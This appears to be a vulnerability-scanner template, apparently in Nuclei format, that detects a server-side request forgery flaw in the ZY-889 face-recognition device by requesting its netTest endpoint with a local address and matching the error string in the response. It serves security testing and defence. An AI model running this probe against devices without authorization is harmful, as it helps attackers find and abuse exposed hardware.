id: webservice-netTest-ssrf

info:
  name: 东菀市智跃科技软件有限公司ZY-889人脸机 - Server Side Request Forgery (SSRF)
  author: qwtd
  severity: medium
  tags: WEBSERVICE

http:
  - method: GET
    path:
      - "{{BaseURL}}/webs/netTest?action=list&group=TESTURL&szAddr=127.0.0.1"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "root.ERR.des"
        part: body

      - type: status
        status:
          - 200

